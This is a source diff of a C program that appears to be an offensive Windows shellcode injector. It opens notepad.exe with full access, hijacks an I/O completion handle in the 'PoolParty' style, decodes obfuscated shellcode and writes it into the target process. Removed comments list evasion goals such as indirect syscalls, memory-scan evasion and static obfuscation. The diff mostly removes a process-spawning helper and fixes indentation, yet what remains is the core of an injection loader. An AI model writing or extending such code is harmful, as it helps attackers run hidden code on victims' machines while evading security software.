@@ -1,3 +1,4 @@
+#include <processthreadsapi.h>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <unwin.h>
@@ -14,47 +15,7 @@
 
 extern Ade GlobalAde;
 
-// TODO: to indirect: SpawnTargetProcess, refactoring, more verbose in debug
-
-/* Objectives:
-    * Inject with PoolParty I/O (starting thread)   (DONE)
-    * Indirect syscalls (dynamic evasion)           (DONE)
-    * ThreadName alloc (memory scan evasion)        (DONE)
-    * Shellcode obfuscation (static evasion)        (DONE)
-
-    * EXTRA: impl. DLL, PE or shellcode injection 
-*/
-
-#define SLEEP_OBF       1000 * 10
 #define TARGET_PROCNAME "notepad.exe"
-
-/* Conditional defines */
-// #define CREATE_NEW_PROCESS  // Create a new process (the target process) for injection 
-// #define DLL_INJECTION       // Inject a DLL (WORKING IN PROCESS)
-// #define PE_INJECTION        // Inject a PE  (WORKING IN PROCESS)
-// #define SHELLCODE_INJECTION // Inject a Shellcode (WORKING IN PROCESS)
-
-WINBOOL SpawnTargetProcess(PHANDLE hProcess) {
-    STARTUPINFOA        startupInfo;
-    PROCESS_INFORMATION processInformation;
-
-    ZeroMemory( &startupInfo, sizeof(startupInfo) );
-    startupInfo.cb = sizeof(startupInfo);
-    ZeroMemory( &processInformation, sizeof(processInformation) );
-
-    return CreateProcessA(
-        TARGET_PROCNAME,
-        NULL,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        &startupInfo,
-        &processInformation
-    );
-}
 
 int GetPidByName(char* processName) {
     int pid = 0;
@@ -73,20 +34,13 @@ int GetPidByName(char* processName) {
 }
 
 int main() {
-	MEMORY_ALLOC memoryShellcodeAlloc;
-	HANDLE       hProcess;
+    MEMORY_ALLOC memoryShellcodeAlloc;
+    HANDLE       hProcess;
 
     GlobalAde = InitAde();
     int pid   = GetPidByName(TARGET_PROCNAME);
 
-#ifdef CREATE_NEW_PROCESS
-    if ( !SpawnTargetProcess(&hProcess) ) {
-        DEBUG_ERROR("CreateProcessA: 0x%lx", GetLastError())
-        DEBUG_GETCHAR()
-        return -1;
-    }
-#else
-	hProcess = OpenProcess(
+    hProcess = OpenProcess(
         PROCESS_ALL_ACCESS,
         FALSE,
         pid
@@ -97,7 +51,6 @@ int main() {
         DEBUG_GETCHAR();
         return -1;
     }
-#endif
 
     HANDLE completionIoHandle = DuplicateHandleK(
         hProcess,
@@ -110,13 +63,13 @@ int main() {
     ShellcodeDecode(shellcode);
 
     if (!ThreadNameAlloc(
-    	hProcess,
-    	shellcode,
-    	shellcodeSize,
-    	&memoryShellcodeAlloc
+        hProcess,
+        shellcode,
+        shellcodeSize,
+        &memoryShellcodeAlloc
     )) {
-    	DEBUG_ERROR("FAILED ThreadNameAlloc");
-    	return -1;
+        DEBUG_ERROR("FAILED ThreadNameAlloc");
+        return -1;
     }
 
     DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);
